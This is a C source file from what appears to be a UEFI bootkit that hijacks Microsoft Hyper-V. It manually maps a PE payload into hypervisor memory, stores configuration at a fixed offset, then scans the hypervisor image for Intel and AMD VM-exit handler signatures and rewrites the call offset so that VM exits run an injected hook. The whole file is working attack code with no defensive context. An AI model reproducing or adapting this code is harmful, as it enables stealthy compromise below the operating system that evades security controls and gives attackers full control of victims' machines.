#include <Uefi.h>
#include <Library/UefiLib.h>
#include <IndustryStandard/PeImage.h>
#include "PeStructs.h"
#include "Utils.h"
#include "Hv.h"
#include "Exploit.h"

VOID* MapModule(PVOYAGER_T VoyagerData, UINT8* ImageBase)
{
	if (!VoyagerData || !ImageBase)
		return NULL;

	EFI_IMAGE_DOS_HEADER* dosHeaders = (EFI_IMAGE_DOS_HEADER*)ImageBase;
	if (dosHeaders->e_magic != EFI_IMAGE_DOS_SIGNATURE)
		return NULL;

	EFI_IMAGE_NT_HEADERS64* ntHeaders = (EFI_IMAGE_NT_HEADERS64*)(ImageBase + dosHeaders->e_lfanew);
	if (ntHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
		return NULL;

	MemCopy((void*)VoyagerData->ModuleBase, ImageBase, ntHeaders->OptionalHeader.SizeOfHeaders);
	EFI_IMAGE_SECTION_HEADER* sections = (EFI_IMAGE_SECTION_HEADER*)((UINT8*)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
	for (UINT32 i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		EFI_IMAGE_SECTION_HEADER* section = &sections[i];
		if (section->SizeOfRawData)
		{
			MemCopy((void*)(VoyagerData->ModuleBase + section->VirtualAddress), ImageBase + section->PointerToRawData, section->SizeOfRawData);
		}
	}

	*(VOYAGER_T*)(VoyagerData->ModuleBase + 0x4028) = *VoyagerData; // Intel - AMD //0x4018 //0x4020
	VOID* Rets = (VOID*)(VoyagerData->ModuleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	MemSet((void*)VoyagerData->ModuleBase, 0, ntHeaders->OptionalHeader.SizeOfHeaders);
	return Rets;
}

VOID MakeVoyagerData(PVOYAGER_T VoyagerData, VOID* HypervAlloc, UINT64 HypervAllocSize, VOID* PayLoadBase, UINT64 PayLoadSize)
{
	VoyagerData->HypervModuleBase = (UINT64)HypervAlloc;
	VoyagerData->HypervModuleSize = HypervAllocSize;
	VoyagerData->ModuleBase = (UINT64)PayLoadBase;
	VoyagerData->ModuleSize = PayLoadSize;

	VOID* VmExitHandler = FindPattern(HypervAlloc, HypervAllocSize, INTEL_VMEXIT_HANDLER_SIG, INTEL_VMEXIT_HANDLER_MASK);
	if (VmExitHandler)
	{
		UINT64 VmExitHandlerCall = ((UINT64)VmExitHandler) + 19; // + 19 bytes to -> call vmexit_c_handler
		UINT64 VmExitHandlerCallRip = (UINT64)VmExitHandlerCall + 5; // + 5 bytes because "call vmexit_c_handler" is 5 bytes
		UINT64 VmExitFunction = VmExitHandlerCallRip + *(INT32*)((UINT64)(VmExitHandlerCall + 1)); // + 1 to skip E8 (call) and read 4 bytes (RVA)
		VoyagerData->VmExitHandlerRva = ((UINT64)GetExpEntry(PayLoadBase)) - (UINT64)VmExitFunction;
	}
	else // else AMD
	{


		VOID* VmExitHandlerCall = FindPattern(HypervAlloc, HypervAllocSize, AMD_VMEXIT_HANDLER_SIG, AMD_VMEXIT_HANDLER_MASK);
		UINT64 VmExitHandlerCallRip = (UINT64)VmExitHandlerCall + 5; // + 5 bytes because "call vmexit_c_handler" is 5 bytes
		UINT64 VmExitHandlerFunc = VmExitHandlerCallRip + *(INT32*)((UINT64)VmExitHandlerCall + 1); // + 1 to skip E8 (call) and read 4 bytes (RVA)
		VoyagerData->VmExitHandlerRva = ((UINT64)GetExpEntry(PayLoadBase)) - VmExitHandlerFunc;
	}
}

VOID* HookVmExit(VOID* HypervBase, VOID* HypervSize, VOID* VmExitHook)
{
	VOID* VmExitHandler = FindPattern(HypervBase, (UINT64)HypervSize, INTEL_VMEXIT_HANDLER_SIG, INTEL_VMEXIT_HANDLER_MASK);
	if (VmExitHandler)
	{
		UINT64 VmExitHandlerCall = ((UINT64)VmExitHandler) + 19; // + 19 bytes to -> call vmexit_c_handler
		UINT64 VmExitHandlerCallRip = (UINT64)VmExitHandlerCall + 5; // + 5 bytes because "call vmexit_c_handler" is 5 bytes
		UINT64 VmExitFunction = VmExitHandlerCallRip + *(INT32*)((UINT64)(VmExitHandlerCall + 1)); // + 1 to skip E8 (call) and read 4 bytes (RVA)
		INT64 NewVmExitRVA = ((INT64)VmExitHook) - VmExitHandlerCallRip;
		*(INT32*)((UINT64)(VmExitHandlerCall + 1)) = (INT32)NewVmExitRVA;
		return (VOID*)(VmExitFunction);
	}
	else // else AMD
	{
		VOID* VmExitHandlerCall = FindPattern(HypervBase, (UINT64)HypervSize, AMD_VMEXIT_HANDLER_SIG, AMD_VMEXIT_HANDLER_MASK);
		UINT64 VmExitHandlerCallRip = ((UINT64)VmExitHandlerCall) + 5; // + 5 bytes to next instructions address...
		UINT64 VmExitHandlerFunction = VmExitHandlerCallRip + *(INT32*)(((UINT64)VmExitHandlerCall) + 1); // + 1 to skip E8 (call) and read 4 bytes (RVA)
		INT64 NewVmExitHandlerRVA = ((INT64)VmExitHook) - VmExitHandlerCallRip;
		*(INT32*)((UINT64)VmExitHandlerCall + 1) = (INT32)NewVmExitHandlerRVA;
		return (VOID*)(VmExitHandlerFunction);
	}
}